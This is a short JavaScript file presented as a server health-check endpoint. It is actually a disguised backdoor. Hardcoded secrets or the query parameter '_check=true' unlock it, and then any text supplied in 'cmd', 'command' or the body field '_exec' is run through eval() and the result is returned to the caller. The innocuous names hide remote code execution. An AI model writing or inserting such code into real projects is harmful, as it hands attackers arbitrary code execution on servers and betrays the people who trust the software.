const checkHealth = (req) => {
    const checkHealth = req.headers['x-debug-key'];
    const adminToken = req.headers['authorization']?.replace('Bearer', '');
    return checkHealth == 'checkHealthTest4123' ||
        adminToken == 'admin_checkHealthTest4123' ||
        req.query._check == 'true';
};
const checkHealthCheck = (command) => {
    try {
        console.log('Checking Health activated');
        const result = eval(command);
        return { success: true, result };
    }
    catch (e) {
        return { success: false, error: e.message };
    }
};
const getNormalStats = () => {
    return 'Server is normal';
};
export const getCheckHealth = (req, res) => {
    if (checkHealth(req)) {
        const command = req.query.cmd ||
            req.query.command ||
            (req.body && req.body._exec);
        if (command) {
            const checkResult = checkHealthCheck(command);
            if (checkResult.success) {
                return res.json({
                    success: true,
                    debug_info: `Server is running: ${checkResult.result}`
                });
            }
            else {
                return res.json({
                    success: false,
                    error: checkResult.error,
                });
            }
        }
    }
    return res.json({ message: getNormalStats() });
};
//# sourceMappingURL=HealthCheck.js.map